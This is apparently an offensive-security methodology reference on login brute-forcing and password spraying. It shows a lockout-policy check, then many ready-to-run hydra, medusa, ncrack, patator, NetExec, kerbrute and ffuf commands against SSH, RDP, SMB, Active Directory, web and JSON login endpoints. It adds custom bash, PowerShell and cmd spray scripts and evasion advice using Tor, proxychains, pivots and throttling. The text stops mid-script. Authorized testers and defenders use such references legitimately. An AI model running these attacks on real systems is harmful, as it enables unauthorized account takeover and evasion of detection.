# Login Brute-Forcing Methodology

Comprehensive reference for protocol-level credential attacks. Every tool-based command is paired with a LOTL bash/PowerShell equivalent where practical.

Cross-references:
- [password-cracking.md](password-cracking.md) — offline hash cracking, wordlist generation
- [active-directory-methodology.md](active-directory-methodology.md) — AD-specific spraying (kerbrute, nxc)
- [web-methodology.md](web-methodology.md) — web application attacks
- [enumeration-methodology.md](enumeration-methodology.md) — service identification

---

## Phase 0: Pre-Flight Checks

### Password Policy Discovery

Always read the policy **before** spraying. A single account lockout can compromise the engagement.

```bash
# AD via netexec (no creds = anonymous; w/ creds = authoritative)
nxc smb <DC_IP> --pass-pol
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
netexec smb <DC_IP> -u guest -p '' --pass-pol

# rpcclient (anonymous)
rpcclient -U "" -N <DC_IP> -c "getdompwinfo"
rpcclient -U "" -N <DC_IP> -c "querydominfo"

# enum4linux-ng
enum4linux-ng -P <DC_IP>

# ldapsearch (anonymous bind on rootDSE / domain)
# Note: DC=corp,DC=local and CORP\ used throughout this file are EXAMPLE values.
# Replace with your engagement's actual base DN and NetBIOS short name.
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" \
  -s base "(objectClass=*)" minPwdLength pwdProperties lockoutThreshold lockoutDuration

# Linux PAM policy (post-foothold)
cat /etc/security/pwquality.conf
cat /etc/pam.d/common-password
chage -l <USER>

# Windows local policy
net accounts
secedit /export /cfg C:\Windows\Temp\pol.cfg
```

### Lockout Awareness

| Field | Implication |
|-------|-------------|
| `lockoutThreshold = 0` | No lockout — spray freely |
| `lockoutThreshold > 0` + `lockoutDuration > 0` | Stay below threshold |
| `lockoutObservationWindow` | Reset window for failed attempts |

> **Rule of thumb:** spray at `threshold − 1` per `observationWindow`, with at least 30–60 min between iterations.

### Username List Hygiene

```bash
# Strip blank lines, dedupe, lowercase
sort -u users.raw | grep -v '^$' | tr 'A-Z' 'a-z' > users.txt

# Off-by-one / common variants from one identity
USER="john.doe"
echo -e "${USER}\n${USER%.*}\n${USER#*.}\n${USER//./}\n${USER//./_}" > users.txt
# john.doe / john / doe / johndoe / john_doe

# Generate from full-name list (First Last → multiple formats)
while IFS=' ' read -r first last; do
  echo "${first,,}.${last,,}"
  echo "${first,,}${last,,}"
  echo "${first:0:1}${last,,}" | tr 'A-Z' 'a-z'
  echo "${first,,}${last:0:1}" | tr 'A-Z' 'a-z'
done < fullnames.txt | sort -u > users.txt
```

---

## Phase 1: Wordlists

### Built-in (Kali default paths)

| Path | Contents |
|------|----------|
| `/usr/share/wordlists/rockyou.txt.gz` | 14M classic leaked-password list |
| `/usr/share/seclists/Passwords/` | Categorized: Common, Default, Leaked-Databases, etc |
| `/usr/share/seclists/Usernames/` | Default usernames per service |
| `/usr/share/wordlists/fasttrack.txt` | Top 200 weak passwords |
| `/usr/share/wordlists/metasploit/` | unix_passwords, http_default_pass, etc |

```bash
# Decompress rockyou (one-time)
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz

# Top 1000 from rockyou
head -n 1000 /usr/share/wordlists/rockyou.txt > top1k.txt

# Length-filtered (avoid policy rejects)
awk 'length($0) >= 8 && length($0) <= 16' /usr/share/wordlists/rockyou.txt > rockyou-8-16.txt
```

### Targeted Wordlists

```bash
# cewl — scrape org website for words
cewl -d 3 -m 6 -w cewl.txt https://<TARGET>
cewl -d 3 -m 6 -e --email_file emails.txt -w cewl.txt https://<TARGET>

# crunch — generate by mask
crunch 8 8 -t Welcome@%% -o welcome.txt   # Welcome@01..Welcome@99
crunch 8 12 abcdef0123456789 -o hex.txt   # length 8-12 hex

# hashcat masks for online too (just feed to hashcat as wordlist via --stdout)
hashcat --stdout -a 3 'Welcome@?d?d' > w.txt

# Mutate existing wordlist with rules
hashcat --stdout rockyou.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Common spray seeds (season + year + symbol)
cat <<EOF > spray.txt
Spring2026!
Summer2026!
Autumn2026!
Winter2026!
Password1
Password123!
Welcome1
Welcome2026!
<COMPANY>2026!
EOF
```

For deeper wordlist crafting, see [password-cracking.md](password-cracking.md).

---

## Phase 2: Hydra — Full Protocol Reference

### Core Flags

| Flag | Purpose |
|------|---------|
| `-l <USER>` | Single username |
| `-L <FILE>` | Username list |
| `-p <PASS>` | Single password |
| `-P <FILE>` | Password list |
| `-C <FILE>` | Combo `user:pass` per line |
| `-s <PORT>` | Custom port |
| `-S` | Use SSL |
| `-e nsr` | Try **n**ull / **s**ame as user / **r**eversed |
| `-f` | Stop after first valid pair (per host) |
| `-F` | Stop after first valid pair (globally) |
| `-t N` | Parallel tasks (default 16; lower for fragile services) |
| `-x MIN:MAX:CHARSET` | Brute-force generator (a=lower, A=upper, 1=digit) |
| `-V` / `-vV` | Verbose |
| `-o <FILE>` | Save successful pairs |
| `-R` | Restore previous session |
| `-w <SEC>` | Per-task timeout |
| `-W <SEC>` | Wait between attempts |
| `-M <FILE>` | Multi-target file |

### Protocol Matrix

```bash
# SSH
hydra -L users.txt -P pass.txt ssh://<TARGET> -t 4 -V
hydra -l root -P pass.txt -e nsr ssh://<TARGET>:22 -o ssh.creds

# FTP
hydra -L users.txt -P pass.txt ftp://<TARGET> -t 4 -e nsr

# Telnet
hydra -L users.txt -P pass.txt telnet://<TARGET> -t 4

# RDP (use ncrack instead — see Phase 4 — hydra rdp is unreliable)
hydra -L users.txt -P pass.txt rdp://<TARGET> -t 1

# SMB
hydra -L users.txt -P pass.txt smb://<TARGET> -t 1

# MSSQL
hydra -L users.txt -P pass.txt mssql://<TARGET> -s 1433

# MySQL
hydra -L users.txt -P pass.txt mysql://<TARGET>

# PostgreSQL
hydra -L users.txt -P pass.txt postgres://<TARGET>

# VNC (no username)
hydra -P pass.txt vnc://<TARGET>

# SNMP (community strings)
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://<TARGET>

# LDAP simple bind
hydra -L users.txt -P pass.txt ldap2://<TARGET>      # ldap v2
hydra -L users.txt -P pass.txt ldap3://<TARGET>      # ldap v3
hydra -L users.txt -P pass.txt ldap3-crammd5://<TARGET>
hydra -L users.txt -P pass.txt ldap3-digestmd5://<TARGET>

# IMAP / IMAPS
hydra -L users.txt -P pass.txt imap://<TARGET>
hydra -L users.txt -P pass.txt imaps://<TARGET> -s 993

# POP3 / POP3S
hydra -L users.txt -P pass.txt pop3://<TARGET>
hydra -L users.txt -P pass.txt pop3s://<TARGET> -s 995

# SMTP / SMTPS
hydra -L users.txt -P pass.txt smtp://<TARGET>
hydra -L users.txt -P pass.txt smtps://<TARGET> -s 465

# IRC
hydra -L users.txt -P pass.txt irc://<TARGET>

# ICQ (legacy)
hydra -L users.txt -P pass.txt icq://<TARGET>

# HTTP Basic Auth (GET)
hydra -L users.txt -P pass.txt <TARGET> http-get /admin/

# HTTP Basic Auth (HEAD — quieter)
hydra -L users.txt -P pass.txt <TARGET> http-head /admin/

# HTTPS Basic
hydra -L users.txt -P pass.txt <TARGET> https-get /admin/ -s 443

# HTTP POST form (most common modern login)
# Syntax: "<PATH>:<POSTDATA>:<F=FAILURE_STRING|S=SUCCESS_STRING>"
hydra -L users.txt -P pass.txt <TARGET> http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials" -V

# HTTPS POST form
hydra -L users.txt -P pass.txt <TARGET> -s 443 https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Login failed" -V

# HTTP POST form with CSRF / cookies
hydra -L users.txt -P pass.txt <TARGET> http-post-form \
  "/login.php:user=^USER^&pass=^PASS^&csrf=<CSRF_TOKEN>:H=Cookie\: PHPSESSID=<SESSION_ID>:F=Invalid" -V
# For dynamic CSRF token capture (fetch-then-submit), see C=<path>:CSRF=^TOKEN^ syntax in deep-dive below
```

### Form Module Syntax Deep-Dive

```text
"<PATH>:<POST_BODY>:<CONDITION>"

PATH       URL path of login submission
POST_BODY  url-encoded form fields with ^USER^ and ^PASS^ markers
CONDITION  one of:
           F=<string>   present in body when login FAILS
           S=<string>   present in body when login SUCCEEDS
           H=<header>   add custom header (Cookie, X-CSRF-Token)
           C=<path>     fetch a token from <path> first

Example with CSRF:
hydra <TARGET> http-post-form \
  "/login:user=^USER^&pass=^PASS^&token=^TOKEN^:H=Cookie\: session=...:F=denied:C=/login:CSRF=^TOKEN^"
```

### Generated Brute-Force Patterns (`-x`)

```bash
# 6-8 chars, lowercase + digits
hydra -l admin -x 6:8:a1 ssh://<TARGET>

# 8 chars, mixed case
hydra -l admin -x 8:8:aA1 ssh://<TARGET>

# Custom charset
hydra -l admin -x 4:4:01ab ssh://<TARGET>      # only 0,1,a,b
```

---

## Phase 3: Medusa

Older, less actively maintained, but module set complements hydra (some protocols faster).

### Core Flags

| Flag | Purpose |
|------|---------|
| `-h <TARGET>` / `-H <FILE>` | Target / target list |
| `-u <USER>` / `-U <FILE>` | User / user list |
| `-p <PASS>` / `-P <FILE>` | Pass / pass list |
| `-C <FILE>` | Combo file `host:user:pass` |
| `-M <MODULE>` | ssh, ftp, smbnt, mssql, http, etc |
| `-m <PARAM>` | Module-specific parameter |
| `-t N` | Threads per host |
| `-T N` | Parallel hosts |
| `-f` | Stop on first valid per host |
| `-F` | Stop on first valid globally |
| `-e ns` | null / same-as-user |
| `-O <FILE>` | Output file |

### Common Commands

```bash
medusa -d                            # list installed modules
medusa -M ssh -q                     # module help

medusa -h <TARGET> -U users.txt -P pass.txt -M ssh -t 4 -f
medusa -h <TARGET> -U users.txt -P pass.txt -M ftp
medusa -h <TARGET> -U users.txt -P pass.txt -M smbnt
medusa -h <TARGET> -U users.txt -P pass.txt -M mssql
medusa -h <TARGET> -U users.txt -P pass.txt -M http -m DIR:/admin/ -m AUTH:BASIC

# HTTP form
medusa -h <TARGET> -U users.txt -P pass.txt -M web-form \
  -m FORM:/login.php -m FORM-DATA:"user=&pass=" -m DENY-SIGNAL:"Invalid"
```

---

## Phase 4: Ncrack — Best for RDP/SSH

Created by the nmap team. Optimized stack — typically more reliable than hydra for **RDP**, on par for SSH.

### Core Flags

| Flag | Purpose |
|------|---------|
| `<service>://<IP>:<PORT>` | Target spec |
| `-U <FILE>` | Usernames |
| `-P <FILE>` | Passwords |
| `--user <USER>` | Single user |
| `--pass <PASS>` | Single pass |
| `-T <0-5>` | Timing template (0=paranoid, 5=insane) |
| `-g cl=N,CL=N,at=N,cd=N,to=N` | Per-service tuning (`cl` connect limit, `CL` parallel max, `at` auth tries per conn, `cd` connect delay, `to` timeout) |
| `-vv` | Verbose |
| `-oN <FILE>` / `-oX <FILE>` | Normal / XML output |
| `--resume <SAVEFILE>` | Continue session |

### Common Commands

```bash
# Supported services
ncrack -V    # version + service list

# RDP (the prime use case)
ncrack -vv -U users.txt -P pass.txt rdp://<TARGET>
ncrack -vv -U users.txt -P pass.txt rdp://<TARGET>:3389 -T 3 -g cl=1,CL=1,cd=3

# SSH
ncrack -vv -U users.txt -P pass.txt ssh://<TARGET>
ncrack -vv --user root -P pass.txt ssh://<TARGET>:22 -T 4

# FTP / Telnet / SMB / VNC / POP3 / IMAP / SMTP / WinRM
ncrack -vv -U users.txt -P pass.txt ftp://<TARGET>
ncrack -vv -U users.txt -P pass.txt smb://<TARGET>
ncrack -vv -U users.txt -P pass.txt vnc://<TARGET>:5900

# Multi-target
ncrack -vv -U users.txt -P pass.txt rdp://<TARGET1> rdp://<TARGET2> rdp://<TARGET3>

# Resume
ncrack --resume restore.bak
```

---

## Phase 5: Patator — Modular & Flexible

Python-based, very flexible. Supports module-specific rate limiting and conditional retry.

### Core Flags

```bash
patator <module> --help
patator ssh_login --help
```

| Flag | Purpose |
|------|---------|
| `0=<FILE>` … `9=<FILE>` | Reference file slots (used as `FILE0`, `FILE1`) |
| `-x <ACTION>:<COND>` | Action on condition (e.g. ignore, retry, free) |
| `-t N` | Threads |
| `--rate-limit S` | Sleep between requests |
| `-R / --retry-delay` | Retry delay |

### Common Modules

```bash
# SSH
patator ssh_login host=<TARGET> user=FILE0 password=FILE1 0=users.txt 1=pass.txt \
  -x ignore:mesg='Authentication failed' -t 4

# FTP
patator ftp_login host=<TARGET> user=FILE0 password=FILE1 0=users.txt 1=pass.txt \
  -x ignore:code=530

# SMB
patator smb_login host=<TARGET> user=FILE0 password=FILE1 0=users.txt 1=pass.txt \
  -x ignore:fgrep='STATUS_LOGON_FAILURE'

# MySQL
patator mysql_login host=<TARGET> user=FILE0 password=FILE1 0=users.txt 1=pass.txt \
  -x ignore:code=1045

# HTTP form (URL-encoded)
patator http_fuzz url=http://<TARGET>/login \
  method=POST body='user=FILE0&pass=FILE1' \
  0=users.txt 1=pass.txt \
  -x ignore:fgrep='Invalid credentials' \
  -x ignore:code=429 \
  --rate-limit 0.5

# DNS subdomain enum (yes, patator does this too)
patator dns_forward name=FILE0.<DOMAIN> 0=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -x ignore:code=3
```

---

## Phase 6: NetExec (nxc) — Windows Spray

Default Windows-spraying tool for AD engagements. See [active-directory-methodology.md](active-directory-methodology.md) for AD context.

```bash
# Validate one set of creds across a subnet
nxc smb <SUBNET>/24 -u <USER> -p '<PASS>'

# Spray one password across a user list
nxc smb <DC_IP> -u users.txt -p 'Spring2026!' --continue-on-success

# Spray one user across many passwords (avoid lockout!)
nxc smb <DC_IP> -u <USER> -p pass.txt --continue-on-success

# Combo file
nxc smb <SUBNET>/24 -u users.txt -p pass.txt --continue-on-success

# Pass-the-Hash
nxc smb <SUBNET>/24 -u <USER> -H <NTLM_HASH>
nxc smb <SUBNET>/24 -u users.txt -H hashes.txt --continue-on-success

# Kerberos auth
nxc smb <DC_IP> -u <USER> -p '<PASS>' -k
nxc smb <DC_IP> --use-kcache         # use KRB5CCNAME ticket

# Other protocols supported
nxc winrm <TARGET> -u <USER> -p '<PASS>'
nxc ldap <DC_IP> -u <USER> -p '<PASS>'
nxc mssql <TARGET> -u <USER> -p '<PASS>'
nxc rdp <TARGET> -u <USER> -p '<PASS>'
nxc ssh <TARGET> -u <USER> -p '<PASS>'
nxc ftp <TARGET> -u <USER> -p '<PASS>'
nxc vnc <TARGET> -p '<PASS>'

# Filter only successful
nxc smb <SUBNET>/24 -u users.txt -p pass.txt --continue-on-success 2>/dev/null | grep '\[+\]'
```

### Username-as-Password Spray

Common in fresh AD enrollments and lazy password resets — users set their password to their own username (or a trivial variant). Pass the same user list as both `-u` and `-p` so each user is tested with their own name as the password.

```bash
# Exact username = password (e.g. jsmith:jsmith)
nxc smb <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# --no-bruteforce pairs line-by-line (user1:pass1, user2:pass2) instead of cartesian product
# Without it, nxc tests every user against every password = N^2 attempts + lockout risk

# WinRM validation for confirmed hits
nxc winrm <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# LDAP (useful when SMB signing blocks relay but you need to confirm creds)
nxc ldap <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# MSSQL variant (service accounts often have username=password)
nxc mssql <TARGET> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# Kerberos auth variant (avoids NTLM logging)
nxc smb <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success -k
```

#### Living-off-the-land / LOTL variant

```powershell
# PowerShell — username-as-password spray via LDAP bind (no tools, no RSAT)
$users = Get-Content users.txt
foreach ($u in $users) {
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<DC_IP>","<DOMAIN>\$u","$u")
    if ($de.distinguishedName) {
        Write-Host "[+] $u : $u" -ForegroundColor Green
    }
    $de.Dispose()
    Start-Sleep -Seconds 2
}
```

```bash
# Bash + rpcclient — username-as-password (Linux LOTL, no nxc needed)
while read -r u; do
  rpcclient -U "${u}%${u}" <DC_IP> -c "getusername" 2>/dev/null | grep -q "Account Name" \
    && echo "[+] ${u}:${u}"
  sleep 2
done < users.txt
```

```cmd
:: Windows cmd — net use username-as-password spray (no PowerShell, no tools)
for /F "tokens=*" %u in (users.txt) do @net use \\<DC_IP>\IPC$ /user:<DOMAIN>\%u %u >nul 2>&1 && echo [+] %u:%u & net use \\<DC_IP>\IPC$ /delete >nul 2>&1
```

---

## Phase 7: Kerberos-Specific Spraying

Cross-link [active-directory-methodology.md](active-directory-methodology.md) for full AD context.

```bash
# kerbrute — username enum + spray (AS-REQ; failed attempts NOT logged as 4625)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid.txt
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid.txt 'Spring2026!'
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> pass.txt <USER>

# Caveats:
#   - kerbrute pre-auth failures DO increment lockout counter (despite myth)
#   - Use --safe to abort if any account is close to lockout
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> --safe users.txt 'Spring2026!'
```

[Back to top](#login-brute-forcing-methodology)

---

## Phase 8: Web Login Brute (ffuf / wfuzz)

```bash
# ffuf — POST form, replace FUZZ in body
ffuf -w pass.txt -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://<TARGET>/login.php \
  -fc 200                                  # filter "fail = 200" (e.g. always returns 200 with error)

# Filter by response size
ffuf -w pass.txt -X POST \
  -d "username=admin&password=FUZZ" \
  -u http://<TARGET>/login \
  -fs 1234                                 # filter known-bad size

# Pitchfork mode (parallel files, line-by-line)
ffuf -w users.txt:USER -w pass.txt:PASS -mode pitchfork \
  -X POST -d "u=USER&p=PASS" \
  -u http://<TARGET>/login -fc 401

# Cluster bomb (cartesian product)
ffuf -w users.txt:USER -w pass.txt:PASS -mode clusterbomb \
  -X POST -d "u=USER&p=PASS" \
  -u http://<TARGET>/login -fc 401

# wfuzz equivalent
wfuzz -c -z file,users.txt -z file,pass.txt \
  --hc 401 -d "username=FUZZ&password=FUZ2Z" \
  http://<TARGET>/login.php

# Cookie / CSRF token forwarding (grab token, then submit)
TOKEN=$(curl -s http://<TARGET>/login | grep -oP 'name="csrf" value="\K[^"]+')
COOKIE=$(curl -si http://<TARGET>/login | grep -i set-cookie | awk '{print $2}' | tr -d ';')
ffuf -w pass.txt -X POST \
  -H "Cookie: $COOKIE" \
  -d "username=admin&password=FUZZ&csrf=$TOKEN" \
  -u http://<TARGET>/login -fc 401
```

> **Tip:** Always run a single known-bad attempt first to identify the precise filter (size, code, words). Then `-fs / -fc / -fw` against that.

### JSON-Body Auth Endpoints (REST / SPA logins)

Modern SPAs and REST APIs often accept ONLY `application/json` for login. Standard form-encoded `http-post-form` payloads return uniform 400s — the JSON body must be embedded inside the post-data field with `\` escaping and the `Content-Type` header set via `H=`.

```bash
# Identify the endpoint and failure marker first via Burp Repeater / curl
curl -s -X POST http://<TARGET>:<PORT>/api/session/authenticate \
  -H 'Content-Type: application/json' \
  -d '{"username":"<USER>","password":"wrong"}'
# Note the exact failure-response substring (e.g. 'Authentication failed', 'Invalid credentials')

# hydra — JSON body with \" escapes and Content-Type via H=
# Pattern: "<PATH>:<JSON_BODY_WITH_ESCAPED_QUOTES>:<F=FAIL_STRING>:H=Content-Type\: application/json"
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> -s <PORT> http-post-form \
  "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64

# User-list + password-list with explicit F= marker
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET> -s <PORT> http-post-form \
  "/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=Invalid credentials:H=Content-Type\: application/json" -t 32

# HTTPS variant
hydra -l <USER> -P rockyou.txt <TARGET> -s 443 https-post-form \
  "/api/v1/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=Unauthorized:H=Content-Type\: application/json" -t 16

# When success returns a token instead of a fail marker — match success string with S=
hydra -l <USER> -P rockyou.txt <TARGET> -s <PORT> http-post-form \
  "/api/login:{\"user\"\:\"^USER^\",\"pass\"\:\"^PASS^\"}:S=accessToken:H=Content-Type\: application/json" -t 32
```

### JSON-Body Auth — ffuf with JSON Post Body (LOTL Alternative)

Some JSON endpoints reject hydra's URL-encoded internals. Use ffuf with `-d` (raw post body) and `-X POST`.

```bash
# ffuf — JSON body via -d, password fuzz
ffuf -u http://<TARGET>:<PORT>/api/session/authenticate \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"<USER>","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -mc all -fr 'Authentication failed' -t 64

# Username + password cluster bomb (cartesian)
ffuf -u http://<TARGET>:<PORT>/api/login \
  -X POST -H 'Content-Type: application/json' \
  -d '{"username":"U","password":"P"}' \
  -w users.txt:U -w rockyou.txt:P \
  -mode clusterbomb -fr 'Invalid' -t 32
```

### JSON-Body Auth — Burp Intruder Alternative

```text
1. Capture login request in Proxy → Send to Intruder (Ctrl+I)
2. Clear payload markers, then highlight username/password values inside the JSON body and Add §
3. Attack type: Pitchfork (1 user : 1 pass per request) or Cluster bomb (cartesian)
4. Payloads → load wordlist for each marker position
5. Options → Grep-Match: add 'Authentication failed' to flag failures (negative match → high length = success)
```

> **Tip:** If the endpoint returns 429 / rate-limit, drop `-t` to 4-8. If it sets a per-IP lockout, rotate via SOCKS upstream or pause and retry — don't burn your only test account.

> **OPSEC:** JSON login bodies often log full request bodies on the server side. Spray volume = log volume. Stay within engagement scope and pre-test with one known-bad attempt to confirm the failure marker before bulk runs.

---

## Phase 9: LOTL Brute Force

When tools cannot be installed (jump host, restricted scope), assemble brute force from shell built-ins.

### Bash + curl (HTTP form)

```bash
#!/bin/bash
# spray.sh
URL="http://<TARGET>/login.php"
USERS="users.txt"
PASS="Spring2026!"
FAIL_STR="Invalid credentials"

while read -r user; do
  RESP=$(curl -s -d "username=${user}&password=${PASS}" "$URL")
  if ! grep -q "$FAIL_STR" <<< "$RESP"; then
    echo "[+] HIT  ${user}:${PASS}"
  fi
done < "$USERS"
```

### Bash parallel (xargs)

```bash
# 10 parallel curl spray
xargs -a users.txt -P 10 -I{} bash -c '
  R=$(curl -s -d "user={}&pass=Spring2026!" http://<TARGET>/login)
  grep -q "Invalid" <<<"$R" || echo "[+] {}:Spring2026!"
'
```

### Bash SSH spray with sshpass

```bash
while read -r user; do
  sshpass -p "Spring2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${user}@<TARGET>" id 2>/dev/null && echo "[+] ${user}:Spring2026!"
  sleep 1
done < users.txt
```

> See [LOTL /dev/tcp port-open check + banner grab](enumeration-methodology.md#lotl-quick-reference).

### PowerShell — SMB / WinRM Spray

```powershell
# SMB credential validation via Test-Path
$users = Get-Content users.txt
$pass  = "Spring2026!"
foreach ($u in $users) {
    $secpw = ConvertTo-SecureString $pass -AsPlainText -Force
    $cred  = New-Object System.Management.Automation.PSCredential("CORP\$u", $secpw)
    try {
        New-PSDrive -Name TestDrv -PSProvider FileSystem -Root "\\<DC_HOSTNAME>\sysvol" -Credential $cred -ErrorAction Stop | Out-Null
        Write-Host "[+] HIT $u:$pass" -ForegroundColor Green
        Remove-PSDrive TestDrv
    } catch {}
    Start-Sleep -Seconds 2
}

# WinRM via Invoke-Command
foreach ($u in (gc users.txt)) {
    $cred = New-Object PSCredential("CORP\$u",(ConvertTo-SecureString $pass -AsPlainText -Force))
    try {
        Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { whoami } -ErrorAction Stop
        Write-Host "[+] $u"
    } catch {}
}
```

### PowerShell — Web Form Spray

```powershell
$users = gc users.txt
$pass  = "Spring2026!"
foreach ($u in $users) {
    $body = @{ username = $u; password = $pass }
    try {
        $r = Invoke-WebRequest -Uri http://<TARGET>/login.php -Method POST -Body $body -UseBasicParsing
        if ($r.Content -notmatch "Invalid") {
            Write-Host "[+] $u:$pass" -ForegroundColor Green
        }
    } catch {}
    Start-Sleep -Milliseconds 500
}
```

### Windows cmd `for /F` Loop

```cmd
:: Iterate users.txt and try `net use` against share
for /F "tokens=*" %u in (users.txt) do @net use \\<TARGET>\C$ /user:CORP\%u Spring2026! >nul 2>&1 && echo [+] %u
```

[Back to top](#login-brute-forcing-methodology)

---

## Phase 10: Detection & Lockout Avoidance

### Timing & Jitter

| Tool | Throttle |
|------|----------|
| hydra | `-t 1 -W 5` (one task, 5-sec wait) |
| ncrack | `-T 1 -g cd=10` (paranoid + 10s connect delay) |
| medusa | `-t 1 -T 1` |
| nxc | natural pace + `--continue-on-success` (no built-in delay → wrap with `sleep`) |
| ffuf | `-p 0.5` (delay between requests) |
| nuclei | `-rate-limit 50` |

### Distributed Source / Pivots

```bash
# Route through SOCKS to vary source
proxychains -q hydra -l user -P pass.txt ssh://<TARGET>

# Multiple Tor circuits
torsocks hydra ...

# Pivot through compromised host -- see [tunneling-pivoting.md](tunneling-pivoting.md) for SOCKS/local-forward setup
ssh -D 9050 jumpuser@jump.target
proxychains hydra ...
```

### Spray-Safe Cadence (AD)

```text
1. Read pass policy: lockoutThreshold = T, observationWindow = W
2. Choose attempts per user per cycle = T - 2  (safety margin of 2)
3. Wait > W between cycles (default 30 min if undefined)
4. Track per-user attempt count locally
5. STOP if any account approaches threshold-1
```

```bash
# Example: nxc with cooldown
for pw in 'Spring2026!' 'Welcome2026!' 'Summer2026!'; do
  nxc smb <DC_IP> -u users.txt -p "$pw" --continue-on-success | tee -a spray.log
  echo "Sleeping 35 min before next password..."
  sleep 2100
done
```

### Lockout-Aware Spray (BadPwdCount Monitoring + Safety Floor)

Per-user `badPwdCount` pre-check beats blind cadence — query the DC's view of each account's failed-attempt counter before each spray attempt, and skip any user near threshold.

```bash
# Pre-spray: read account-lockout-threshold and observation window (authoritative)
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M pso              # fine-grained (PSO) policies
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M get-desc-users   # context

# Same via raw LDAP (lockoutThreshold is in 100-nanosecond intervals for durations)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
  -b "DC=corp,DC=local" -s base \
  "(objectClass=*)" lockoutThreshold lockoutDuration lockOutObservationWindow \
  minPwdLength pwdProperties

# Per-user pre-check: query badPwdCount BEFORE each attempt
# (badPwdCount is per-DC and not replicated — query the DC you'll auth against)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
  -b "DC=corp,DC=local" \
  "(sAMAccountName=<TARGET_USER>)" sAMAccountName badPwdCount lastLogonTimestamp lockoutTime

# Bulk-dump badPwdCount for every user in users.txt against a specific DC
while read -r u; do
  CNT=$(ldapsearch -x -LLL -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
    -b "DC=corp,DC=local" "(sAMAccountName=$u)" badPwdCount 2>/dev/null \
    | awk '/^badPwdCount:/ {print $2}')
  echo "${u}:${CNT:-0}"
done < users.txt > badpwd.snapshot
```

```powershell
# PowerShell [adsisearcher] equivalent (no RSAT required)
$searcher = [adsisearcher]"(&(objectCategory=user)(sAMAccountName=<TARGET_USER>))"
$searcher.PropertiesToLoad.AddRange(@('sAMAccountName','badPwdCount','lockoutTime','pwdLastSet'))
$searcher.FindOne().Properties

# Domain policy via [adsisearcher]
([adsisearcher]"(objectClass=domainDNS)").FindOne().Properties |
  Select-Object lockoutthreshold, lockoutduration, lockoutobservationwindow

# Bulk badPwdCount snapshot
Get-Content users.txt | ForEach-Object {
    $s = [adsisearcher]"(&(objectCategory=user)(sAMAccountName=$_))"
    $s.PropertiesToLoad.AddRange(@('sAMAccountName','badPwdCount'))
    $r = $s.FindOne()
    "{0}:{1}" -f $_, ($r.Properties['badpwdcount'][0])
}
```

```bash
# Safety floor: skip user if badPwdCount > (threshold - 2)
THRESHOLD=5            # from --pass-pol output
FLOOR=$((THRESHOLD - 2))
SPRAY_PASS='Spring2026!'

while read -r u; do
  CNT=$(ldapsearch -x -LLL -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
    -b "DC=corp,DC=local" "(sAMAccountName=$u)" badPwdCount 2>/dev/null \
    | awk '/^badPwdCount:/ {print $2}')
  CNT=${CNT:-0}
  if [ "$CNT" -ge "$FLOOR" ]; then
    echo "[!] SKIP $u (badPwdCount=$CNT >= floor=$FLOOR)" | tee -a spray.log
    continue
  fi
  echo "[*] TRY  $u (badPwdCount=$CNT)" | tee -a spray.log
  nxc smb <DC_IP> -u "$u" -p "$SPRAY_PASS" 2>&1 | tee -a spray.log
  sleep 5
done < users.txt

# kerbrute --safe aborts the whole spray if any account is at threshold-1
# (kerbrute pre-auth failures DO increment badPwdCount despite the AS-REQ myth)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> --safe \
  users.txt 'Spring2026!' -o kerbrute.out

# NetExec: do NOT use --continue-on-success when chasing a single password
# across many users if you want explicit per-user pacing. Add sleep wrapper:
while read -r u; do
  nxc smb <DC_IP> -u "$u" -p 'Spring2026!'
  sleep 3
done < users.txt
```

```bash
# badPwdCount reset: lockoutObservationWindow (default 30 min) auto-decrements
# per-DC. Confirm window from the policy read above, then time the next spray
# cycle to land AFTER the window has elapsed since the LAST failed attempt.
OBS_WIN_SEC=1800       # 30 min default; convert from 100-ns intervals if read raw
SAFETY_BUFFER=300      # extra 5 min
echo "Sleeping $((OBS_WIN_SEC + SAFETY_BUFFER))s before next cycle..."
sleep $((OBS_WIN_SEC + SAFETY_BUFFER))

# Re-snapshot badPwdCount post-window to confirm reset before next round
while read -r u; do
